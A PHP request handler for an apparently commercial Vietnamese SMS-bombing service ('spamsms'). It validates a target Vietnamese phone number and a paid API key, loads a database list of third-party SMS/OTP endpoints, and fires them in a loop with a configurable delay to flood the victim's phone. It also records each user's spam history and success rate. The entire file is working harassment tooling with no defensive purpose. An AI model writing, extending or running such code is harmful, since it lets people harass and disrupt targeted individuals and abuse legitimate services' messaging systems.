<?php
// process.php
session_start();
header('Content-Type: application/json');

// Include files
require_once 'spamsms.php';
require_once 'includes/APIManager.php';
require_once 'includes/UserManager.php';

// Nhận dữ liệu từ POST
$input = json_decode(file_get_contents('php://input'), true);

if (!$input) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Dữ liệu không hợp lệ!'
    ]);
    exit;
}

// Lấy dữ liệu
$sdt = preg_replace('/[^0-9]/', '', $input['sdt'] ?? '');
$loop = (int)($input['loop'] ?? 1);
$delay = (float)($input['delay'] ?? 0);
$api_key = $input['api_key'] ?? '';
$features = $input['features'] ?? [];

// Validate
if (empty($sdt)) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Vui lòng nhập số điện thoại!'
    ]);
    exit;
}

if (!preg_match('/^(09|08|07|03|05)\d{8}$/', $sdt)) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Số điện thoại không hợp lệ!'
    ]);
    exit;
}

// Validate API key
$userManager = new UserManager();
$keyValidation = $userManager->validateApiKey($api_key);

if (!$keyValidation['valid']) {
    echo json_encode([
        'status' => 'error',
        'message' => 'API Key không hợp lệ hoặc đã hết hạn!'
    ]);
    exit;
}

// Set API key cho request
$_SERVER['HTTP_X_WUSTEAM'] = $api_key;
$_GET['sdt'] = $sdt;

try {
    // Load APIs from database
    $apiManager = new APIManager();
    $apis = $apiManager->getActiveAPIs();
    
    if (empty($apis)) {
        echo json_encode([
            'status' => 'error',
            'message' => 'Không có API nào đang hoạt động!'
        ]);
        exit;
    }
    
    // Khởi tạo
    $common = new WusTeam\SpamSMS\Main();
    $wt = new WusTeam\SpamSMS\WT();
    
    // Thêm APIs từ database vào WT
    foreach ($apis as $api) {
        // Xử lý URL với params
        $url = $api['url'];
        if (!empty($api['params'])) {
            $url .= '?' . $api['params'];
        }
        
        // Tạo SpamSMS object
        $spamSMS = new WusTeam\SpamSMS\SpamSMS(
            $url,
            $api['method'],
            $api['headers'] ?? [],
            $api['body']
        );
        
        // Thêm vào WT
        $wt->API($api['id'], $spamSMS);
    }
    
    // Thực thi
    $controller = new WusTeam\SpamSMS\Controller($wt, $common);
    $result = $controller->execute($loop, $delay);
    
    // Parse kết quả
    $resultData = json_decode($result, true);
    
    // Lưu lịch sử spam
    if (isset($resultData['r'])) {
        $r = $resultData['r'];
        $userManager->saveSpamHistory($keyValidation['user_id'], [
            'phone' => $sdt,
            'loops' => $loop,
            'delay' => $delay,
            'total_requests' => $r['total_requests'] ?? 0,
            'success_count' => $r['statistics']['total_success'] ?? 0,
            'failed_count' => $r['statistics']['total_failed'] ?? 0,
            'success_rate' => floatval(str_replace('%', '', $r['statistics']['success_rate'] ?? '0')),
            'details' => $r['results'] ?? []
        ]);
    }
    
    echo $result;
    
} catch (Exception $e) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Lỗi: ' . $e->getMessage()
    ]);
}